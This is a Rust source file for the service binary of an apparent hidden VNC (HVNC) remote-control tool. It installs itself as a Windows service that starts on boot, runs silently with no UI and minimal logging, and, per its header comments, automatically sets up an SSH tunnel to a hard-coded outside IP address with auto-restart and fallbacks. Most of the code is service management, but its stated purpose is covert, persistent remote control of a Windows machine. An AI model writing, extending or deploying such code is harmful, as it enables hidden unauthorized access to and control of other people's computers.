//! Hidden VNC Service Binary
//! Enhanced HVNC Service Binary
//! 
//! This binary runs as a Windows service with complete silent operation:
//! - No UI or popup windows
//! - Automatic tunnel configuration to tunneluser@146.190.74.86
//! - Auto-restart on failure
//! - Silent SSH setup with fallbacks

use hidden_vnc::{
    host::{HvncService, ServiceConfig, ServiceControl, service::ServiceStatus},
    Result, HvncError,
};
use log::{info, error, warn};
use clap::{Arg, Command};
use std::process;

fn main() -> Result<()> {
    // Parse command line arguments
    let matches = Command::new("hvnc-service")
        .version("0.1.0")
        .author("Hidden VNC Team")
        .about("Hidden VNC Background Service")
        .arg(
            Arg::new("install")
                .long("install")
                .help("Install as Windows service")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("uninstall")
                .long("uninstall")
                .help("Uninstall Windows service")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("start")
                .long("start")
                .help("Start the service")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("stop")
                .long("stop")
                .help("Stop the service")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("status")
                .long("status")
                .help("Check service status")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("service")
                .long("service")
                .help("Run as service (internal use)")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("console")
                .long("console")
                .help("Run in console mode (for testing)")
                .action(clap::ArgAction::SetTrue)
        )
        .arg(
            Arg::new("verbose")
                .short('v')
                .long("verbose")
                .help("Enable verbose logging")
                .action(clap::ArgAction::SetTrue)
        )
        .get_matches();

    // Initialize logging (silent for service mode)
    let log_level = if matches.get_flag("service") {
        "error" // Silent service mode
    } else if matches.get_flag("verbose") {
        "debug"
    } else {
        "info"
    };
    
    env_logger::Builder::from_env(env_logger::Env::default().default_filter_or(log_level)).init();

    // Handle command line options
    if matches.get_flag("install") {
        return install_service();
    }
    
    if matches.get_flag("uninstall") {
        return uninstall_service();
    }
    
    if matches.get_flag("start") {
        return start_service();
    }
    
    if matches.get_flag("stop") {
        return stop_service();
    }
    
    if matches.get_flag("status") {
        return check_service_status();
    }
    
    if matches.get_flag("service") {
        return run_as_service();
    }
    
    if matches.get_flag("console") {
        return run_in_console();
    }

    // Default: show help
    show_usage();
    Ok(())
}

/// Install the service
fn install_service() -> Result<()> {
    println!("Installing Hidden VNC Service...");
    
    // Check if running as administrator
    if !is_administrator() {
        eprintln!("Error: Administrator privileges required to install service.");
        eprintln!("Please run this command as Administrator.");
        process::exit(1);
    }

    match HvncService::install_service() {
        Ok(()) => {
            println!("✓ Service installed successfully!");
            println!("The Hidden VNC service will now start automatically on boot.");
            println!("Use 'hvnc-service --status' to check service status.");
        }
        Err(e) => {
            eprintln!("✗ Service installation failed: {}", e);
            process::exit(1);
        }
    }

    Ok(())
}

/// Uninstall the service
fn uninstall_service() -> Result<()> {
    println!("Uninstalling Hidden VNC Service...");
    
    if !is_administrator() {
        eprintln!("Error: Administrator privileges required to uninstall service.");
        eprintln!("Please run this command as Administrator.");
        process::exit(1);
    }

    match HvncService::uninstall_service() {
        Ok(()) => {
            println!("✓ Service uninstalled successfully!");
        }
        Err(e) => {
            eprintln!("✗ Service uninstallation failed: {}", e);
            process::exit(1);
        }
    }

    Ok(())
}

/// Start the service
fn start_service() -> Result<()> {
    println!("Starting Hidden VNC Service...");
    
    match ServiceControl::start_service() {
        Ok(()) => {
            println!("✓ Service started successfully!");
        }
        Err(e) => {
            eprintln!("✗ Service start failed: {}", e);
            process::exit(1);
        }
    }

    Ok(())
}

/// Stop the service
fn stop_service() -> Result<()> {
    println!("Stopping Hidden VNC Service...");
    
    match ServiceControl::stop_service() {
        Ok(()) => {
            println!("✓ Service stopped successfully!");
        }
        Err(e) => {
            eprintln!("✗ Service stop failed: {}", e);
            process::exit(1);
        }
    }

    Ok(())
}

/// Check service status
fn check_service_status() -> Result<()> {
    println!("Checking Hidden VNC Service status...");
    
    match ServiceControl::get_service_status() {
        Ok(status) => {
            match status {
                ServiceStatus::Running => {
                    println!("✓ Service is RUNNING");
                    println!("The Hidden VNC service is active and ready for connections.");
                }
                ServiceStatus::Stopped => {
                    println!("⚠ Service is STOPPED");
                    println!("Use 'hvnc-service --start' to start the service.");
                }
                ServiceStatus::NotInstalled => {
                    println!("✗ Service is NOT INSTALLED");
                    println!("Use 'hvnc-service --install' to install the service.");
                }
                ServiceStatus::Unknown => {
                    println!("? Service status is UNKNOWN");
                }
            }
        }
        Err(e) => {
            eprintln!("✗ Failed to check service status: {}", e);
            process::exit(1);
        }
    }

    Ok(())
}

/// Run as Windows service
fn run_as_service() -> Result<()> {
    info!("Starting Hidden VNC Service...");
    
    // This is called by Windows Service Manager
    match HvncService::run_as_service() {
        Ok(()) => {
            info!("Service stopped normally");
        }
        Err(e) => {
            error!("Service error: {}", e);
            process::exit(1);
        }
    }

    Ok(())
}

/// Run in console mode (for testing)
fn run_in_console() -> Result<()> {
    println!("Running Hidden VNC Service in console mode...");
    println!("Press Ctrl+C to stop the service.");
    
    let config = ServiceConfig {
        silent_mode: false, // Show output in console mode
        ..ServiceConfig::default()
    };
    
    let service = HvncService::new(config);
    
    // Set up Ctrl+C handler
    let service_running = service.running.clone();
    ctrlc::set_handler(move || {
        println!("\nReceived Ctrl+C, stopping service...");
        service_running.store(false, std::sync::atomic::Ordering::Relaxed);
    }).expect("Error setting Ctrl+C handler");

    // Start service
    service.start()?;
    
    println!("✓ Service started in console mode");
    println!("Service is now running and ready for connections.");
    
    // Keep running until Ctrl+C
    while service.running.load(std::sync::atomic::Ordering::Relaxed) {
        std::thread::sleep(std::time::Duration::from_secs(1));
    }
    
    // Stop service
    service.stop()?;
    println!("✓ Service stopped");

    Ok(())
}

/// Show usage information
fn show_usage() {
    println!("Hidden VNC Service Manager");
    println!();
    println!("USAGE:");
    println!("    hvnc-service [OPTIONS]");
    println!();
    println!("OPTIONS:");
    println!("    --install     Install as Windows service");
    println!("    --uninstall   Uninstall Windows service");
    println!("    --start       Start the service");
    println!("    --stop        Stop the service");
    println!("    --status      Check service status");
    println!("    --console     Run in console mode (for testing)");
    println!("    --verbose     Enable verbose logging");
    println!("    --help        Show this help message");
    println!();
    println!("EXAMPLES:");
    println!("    hvnc-service --install    # Install service (requires admin)");
    println!("    hvnc-service --status     # Check if service is running");
    println!("    hvnc-service --console    # Run in console for testing");
    println!();
    println!("NOTES:");
    println!("- Installation and uninstallation require Administrator privileges");
    println!("- Once installed, the service starts automatically on boot");
    println!("- The service runs silently in the background with no UI");
    println!("- Use the GUI client to connect to the service");
}

/// Check if running as administrator (Windows)
fn is_administrator() -> bool {
    #[cfg(windows)]
    {
        use std::ptr;
        use winapi::um::processthreadsapi::GetCurrentProcess;
        use winapi::um::securitybaseapi::GetTokenInformation;
        use winapi::um::winnt::{TokenElevation, TOKEN_ELEVATION, TOKEN_QUERY};
        use winapi::um::handleapi::CloseHandle;

        unsafe {
            let mut token = ptr::null_mut();
            if winapi::um::processthreadsapi::OpenProcessToken(
                GetCurrentProcess(),
                TOKEN_QUERY,
                &mut token,
            ) == 0 {
                return false;
            }

            let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
            let mut size = 0;
            let result = GetTokenInformation(
                token,
                TokenElevation,
                &mut elevation as *mut _ as *mut _,
                std::mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut size,
            );

            CloseHandle(token);

            result != 0 && elevation.TokenIsElevated != 0
        }
    }
    
    #[cfg(not(windows))]
    {
        // On non-Windows systems, assume we have the necessary privileges
        true
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_service_commands() {
        // Test that the service commands don't panic
        // Actual functionality requires Windows and admin privileges
        
        // These should not panic even if they fail
        let _ = ServiceControl::get_service_status();
    }
}